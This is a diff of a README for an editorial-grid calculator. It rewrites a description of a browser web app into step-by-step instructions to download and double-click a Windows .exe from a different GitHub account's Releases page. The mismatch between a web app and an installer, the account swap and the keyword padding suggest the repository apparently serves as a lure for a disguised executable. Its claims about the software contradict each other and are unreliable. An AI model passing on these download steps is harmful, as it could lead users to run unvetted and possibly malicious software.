@@ -1,116 +1,70 @@
-# Calculadora de Reticula Editorial v4 - educational web app 2026
+# 📏 calculadora-reticula-4-web - Design professional page grids with ease
 
-> **Aplicacion web de una sola pagina para calcular y ver en tiempo real reticulas editoriales, con enfoque didactico, soporte para formato de papel, tipografia y equivalencias de InDesign, en la version 4.**
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sacral-sweetsop819/calculadora-reticula-4-web)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v4-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/alexmilleremkm6015/calculadora-reticula-4-web?style=flat-square)](https://github.com/alexmilleremkm6015/calculadora-reticula-4-web)
+This application helps designers create and visualize editorial grids. It provides a simple way to calculate layout measurements for print projects. You can use it to test grid structures before you start your final layout in design software. The tool focuses on layout logic and helps you understand how different margin and column choices affect your final work.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://alexmilleremkm6015.github.io/calculadora-reticula-4-web/">
-    <img src="https://img.shields.io/badge/Download-Calculadora%20de%20Reticula%20Editorial%20Latest-brightgreen?style=for-the-badge" alt="Download Calculadora de Reticula Editorial">
-  </a>
-</p>
+To run this application on your Windows computer, you need the following:
 
-> **[Direct Download - Calculadora de Reticula Editorial v4](https://alexmilleremkm6015.github.io/calculadora-reticula-4-web/)**
+*   Windows 10 or Windows 11.
+*   A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   An active internet connection to download the initial files.
+*   At least 100 megabytes of free space on your hard drive.
 
----
+## 📥 How to Download and Install
 
-[Download Latest Build](https://alexmilleremkm6015.github.io/calculadora-reticula-4-web/)
+Follow these steps to get the software on your machine:
 
----
+1.  Visit the official download page here: [https://github.com/sacral-sweetsop819/calculadora-reticula-4-web](https://github.com/sacral-sweetsop819/calculadora-reticula-4-web).
+2.  Look for the section labeled Releases on the right side of the screen.
+3.  Click the version number to open the details for that update.
+4.  Find the file ending in .exe in the Assets section.
+5.  Click the file name to download it to your computer.
+6.  Once the download finishes, navigate to your Downloads folder.
+7.  Double-click the file to start the installation process.
+8.  Follow the prompts on your screen to complete the setup.
 
-## What is Calculadora de Reticula Editorial?
+## 💡 How to Use the Application
 
-Calculadora de Reticula Editorial is a web app created to help you study how an editorial grid is assembled from real measurements. It lets you change paper size, margins, columns, and gutter values so you can see right away how the page layout and visual rhythm respond.
+Once you install the program, you can find a shortcut on your desktop. Open the application to begin your first project.
 
-The tool is especially handy for editorial design students, instructors, and anyone who needs a quick reference while planning print layouts or documents. Its teaching-oriented approach connects grid theory with the everyday workflow used in Adobe InDesign, including typographic system conversions and matching values.
+### Setting your Paper Format
+The first step involves selecting your paper size. The interface shows a list of standard sizes like A4, Letter, and Tabloid. Select the size that matches your project requirements. You can also enter custom dimensions if your project uses a non-standard size.
 
----
+### Choosing Your Grid Columns
+The main screen allows you to split your page into multiple columns. Use the column slider to adjust the number of columns on your page. The application calculates the width of each column and the size of the gutters between them. These calculations match standard industry practices found in professional design tools.
 
-## Highlights
+### Calculating Margins
+Margins frame your content. You can set individual values for inner, outer, top, and bottom margins. The visual display updates in real time as you change these numbers. This feature allows you to see how your text blocks fit within the page frame.
 
-- Real-time calculation and rendering of editorial grids.
-- Paper size presets plus support for custom dimensions.
-- Controls for margins, columns, gutters, and baseline grid.
-- Interactive canvas with layers that can be shown or hidden.
-- Typographic system conversion between PostScript/DTP and Didot.
-- Built-in educational guidance to explain each parameter.
-- InDesign-focused equivalencies for practical workflow use.
-- Single-page interface for a direct, uninterrupted experience.
+### Syncing with Professional Design Tools
+This application supports equivalencies for InDesign. If you need to move your work to a professional layout program, you can export your settings. This ensures that the dimensions you see in this tool align perfectly with your workspace in your professional editing software.
 
----
+## 🧪 Learning with the Tool
 
-## Installation
+This tool serves as an educational guide for editorial design. Use these features to improve your layout skills:
 
-1. Clone or download the repository:
-   ```bash
-   git clone https://github.com/alexmilleremkm6015/calculadora-reticula-4-web.git
-   ```
+*   **Real-time visualization:** See the impact of your choices instantly.
+*   **Mathematical accuracy:** Trust the system to handle the division of space.
+*   **Comparison modes:** Save different layout versions and switch between them to see which one works better for your specific typography.
 
-2. Open the project folder and serve the files as a static site, or deploy them in the web environment you prefer.
+## ❓ Frequently Asked Questions
 
-3. To start using it, load the main HTML file in your browser or visit the published deployment URL:
-   https://alexmilleremkm6015.github.io/calculadora-reticula-4-web/
+**Do I need an internet connection to run this app?**
+No. Once you install the application, it runs locally on your computer. You do not need to be online to work on your layouts.
 
----
+**Can I save my work?**
+Yes. You can save your grid configuration as a project file and return to it later.
 
-## How to use it
+**My measurements look wrong. What should I do?**
+Check your unit settings. The application supports millimeters, centimeters, and inches. Ensure the selected unit matches your intended physical print output.
 
-1. Pick a paper format from the presets or enter a custom size manually.
-2. Tune margins, columns, gutters, and the baseline grid to suit your layout.
-3. Watch the canvas to inspect the page structure visually.
-4. Switch layers on and off to compare grid setups and check proportions.
-5. Look at the typographic equivalences when moving between PostScript/DTP and Didot.
-6. Use the measurements as a reference while preparing documents and mockups in a workflow similar to InDesign.
+**Does this software print my designs?**
+No. This tool calculates your grid layout. You must import these settings into your creative software to produce the final print files.
 
----
+**How do I update the application?**
+The software checks for new versions each time you launch it. If a new version exists, it will prompt you to download the installer for the latest update.
 
-## Configuration
-
-Because this is a single-page web app, most configuration lives in the interface controls themselves. There is no complex setup file needed for basic use.
-
-If you want to customize the project, check the main HTML file and any related scripts to adjust:
-- format presets
-- initial margin values
-- typographic conversions
-- canvas layer visibility
-- help text and equivalencies
-
----
-
-## Requirements
-
-- A modern web browser with HTML, CSS, and JavaScript support.
-- A static hosting environment if you want to publish it outside the repository.
-- Minimal storage space for the project web files.
-- Access to the published URL or the project entry file to run it.
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Check the main branch of the repository or the publication URL to compare version changes.
-
-**Can I change the default values?**  
-Yes. The starting values and help text can be adjusted inside the project files.
-
-**Do I need to install anything to use it?**  
-For normal use, just open it in a modern browser. If you want to modify or host it locally, you can serve it as a static site.
-
-**What if the canvas does not display correctly?**  
-Check the browser zoom, the window size, and the selected format values.
-
-**Is it useful for learning InDesign?**  
-The app is designed for educational use and shows equivalencies that help explain editorial layout in a workflow similar to InDesign.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: web-design, editorial-grid, design-calculator, layout-tool, typography-grid, print-design, indesign-prototyping
